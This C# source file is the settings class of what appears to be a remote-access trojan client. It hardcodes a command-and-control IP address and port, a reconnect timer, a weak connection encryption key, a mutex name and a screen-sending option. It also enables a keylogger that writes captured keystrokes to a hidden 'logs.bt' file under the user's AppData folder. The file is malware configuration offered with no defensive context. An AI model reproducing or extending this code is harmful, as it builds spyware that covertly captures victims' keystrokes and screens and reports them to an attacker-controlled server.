using NetworkCommsDotNet.Connections.TCP;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Config
{
    class Settings
    {
        //---------------CONNECTION---------------//

        public static readonly string CNC_ADDRESS = "155.4.107.23";
        public static readonly int CNC_PORT = 5860;
        public static readonly int CNC_RECONNECT_TIME = 800;

        //--------COMMUNICATION CRYPTOGRAPHY--------//

        public static readonly string CONNECTION_ENCRYPTION_KEY = "123";
        // This constant is used to determine the keysize of the encryption algorithm in bits.
        // We divide this by 8 within the code below to get the equivalent number of bytes.
        public static readonly int CONNECTION_ENCRYPTION_KEYSIZE = 256;
        // This constant determines the number of iterations for the password bytes generation function.
        public static readonly int CONNECTION_ENCRYPTION_DERIVACTION_ITERATIONS = 5000;

        //-----------------OTHER-----------------//
        public static readonly string MUTEX = "DUZZ_MUTX_586453c8-147e-4947-9ae6-1b55f93f883b";
        public static readonly bool HASH_OPTIMIZE_SCREEN_SEND = true;

        //-----------------KEYLOG-----------------//
        public static readonly bool ENABLE_KEYLOG = true;
        public static readonly Environment.SpecialFolder KEYLOG_SPECIAL_FOLDER = Environment.SpecialFolder.ApplicationData;
        public static readonly string KEYLOG_ROOT_PATH = Environment.GetFolderPath(KEYLOG_SPECIAL_FOLDER);
        public static readonly string KEYLOG_SUB_PATH = "logs";
        public static readonly string KEYLOG_FILE_NAME = "logs.bt";
        public static readonly int KEYLOG_BUFFER_FLUSH_DELAY = 5000;
    }
}
